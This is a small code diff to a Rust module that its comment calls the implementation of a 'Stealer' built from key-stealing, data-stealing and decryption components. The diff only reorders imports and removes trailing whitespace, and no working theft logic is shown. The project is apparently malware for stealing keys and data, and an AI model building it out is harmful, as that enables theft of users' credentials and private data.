@@ -1,15 +1,14 @@
 /**
  * This module contains implementation of Stealer.
- * 
+ *
  * Max A.Jurankov (astronmax)
  */
-
-use crate::key_stealers::KeyStealer;
 use crate::data_stealers::{Data, DataStealer};
 use crate::decryptors::Decryptor;
+use crate::key_stealers::KeyStealer;
 
 // Stealer structure.
-// To use it you need to choose which KeyStealer, DataStealer 
+// To use it you need to choose which KeyStealer, DataStealer
 // and Decryptor your Stealer will use.
 pub struct Stealer {
     key_stealer: Box<dyn KeyStealer>,
